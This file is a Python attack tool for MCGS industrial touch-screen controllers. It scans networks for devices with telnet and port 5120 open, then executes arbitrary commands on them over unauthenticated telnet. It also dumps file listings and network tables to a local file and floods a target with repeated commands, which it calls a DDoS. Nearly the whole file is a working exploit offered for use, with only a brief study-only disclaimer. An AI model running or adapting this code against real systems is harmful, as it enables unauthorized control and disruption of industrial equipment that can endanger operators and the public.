#!/usr/bin/python3
# @Мартин.
import telnetlib,time,nmap,sys,textwrap,argparse
from loguru import logger

Version = "@Мартин. MCGS_DDOS Tool V1.0.0"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Ding_talk_headers = {'Content-Type': 'application/json;charset=utf-8'}
Logo=f'''
.------..------..------..------..------..------..------.
|M.--. ||C.--. ||G.--. ||S.--. ||_.--. ||D.--. ||D.--. |
| (\/) || :/\: || :/\: || :/\: || :/\: || :/\: || :/\: |
| :\/: || :\/: || :\/: || :\/: || :\/: || (__) || (__) |
| '--'M|| '--'C|| '--'G|| '--'S|| '--'_|| '--'D|| '--'D|
`------'`------'`------'`------'`------'`------'`------'
Github==>https://github.com/MartinxMax
{Version}  
'''


def Init_Loger():
    logger.remove()
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )


class mcgsProcess():
    def __init__(self,args):
        self.scan = args.SCAN
        self.rhost = args.RHOST
        self.command = args.COMMAND
        self.dd = args.DD
        self.echo = ('on' if args.ECHO else 'off')
        self.machineinfo = ['dir /s', 'netstat -n', 'netstat -r']


    def run(self):
        if self.scan:
            self.__scanner__(self.scan)
        else:
            if self.rhost:
                if not self.command:
                    self.__machineInfo__()
                elif self.dd:
                    while True:
                        try:
                            self.__executeCommand__(self.command or '','on')
                        except KeyboardInterrupt:
                            break

                else:
                    self.__executeCommand__(self.command,self.echo)
            else:
                logger.error('You must fill in the goal! use (-rh) parameter')


    def __scanner__(self,ips):
        nm = nmap.PortScanner()
        nm.scan(hosts=ips, arguments='-p23,5120 --open')
        for host in nm.all_hosts():
            if 'tcp' in nm[host]:
                if 23 in nm[host]['tcp'] and 5120 in nm[host]['tcp']:
                    if 'barracuda-bbs' in nm[host]['tcp'][5120]['name'].lower():
                        logger.warning(f"Found MCGS touch screen, there may be a vulnerability---{host}")


    def __savelog__(self,filename,content):
        with open('./'+filename+'.txt','w',encoding='utf-8')as f:
            f.write(content)


    def __executeCommand__(self,command,echo='off'):
        tn = telnetlib.Telnet(self.rhost, 23)
        welcome_msg = tn.read_until(b"\r\n")
        if welcome_msg.decode('gbk') :
            logger.info('Successfully connected to the target!')
        else:
            logger.error('Failed to access the target!')
        command = 'start cmd /k ' + command if 'on' in echo else command
        tn.write(command.encode() + b"\n")
        time.sleep(0.5)
        lines = tn.read_very_eager().decode("gbk").strip()
        tn.close()
        if lines :
            logger.info(f'<{command}> Command execution successful!')
            if command:
                logger.warning(f'----------\nRecv:\n{lines}\n--------')
            return lines
        else:
            logger.error(f'<{command}> Command execution failed!')
            return ''


    def __machineInfo__(self):
        data = ''
        for info in self.machineinfo:
            data += self.__executeCommand__(info) + '\n------------\n'
            time.sleep(1)
        self.__savelog__(self.rhost,data)


def main():
    print(Logo,"\n",Title)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
            python3 {MCGS} -scan 192.168.0/24 # Scan industrial control devices with vulnerabilities in the current network segment
            python3 {MCGS} -rh 192.168.0.2 # Obtain the equipment information of the industrial control equipment
            python3 {MCGS} -rh 192.168.0.2 -cmd <command> # Execute commands on this industrial control device
            python3 {MCGS} -rh 192.168.0.2 -cmd <command> -echo # Execute command and echo the other party's screen
            python3 {MCGS} -rh 192.168.0.2 -dd # DDOS attack on target
            '''.format(MCGS = sys.argv[0]
                )))
    parser.add_argument('-scan', '--SCAN',default='', help='Scanning MCGS')
    parser.add_argument('-rh', '--RHOST', default='', help='Target')
    parser.add_argument('-cmd', '--COMMAND', default='', help='Command')
    parser.add_argument('-echo', '--ECHO', action='store_true', help='Execute command and echo the other party\'s screen')
    parser.add_argument('-dd', '--DD', action='store_true', help='DDOS')
    args = parser.parse_args()
    mcgsProcess(args).run()


if __name__ == '__main__':
    main()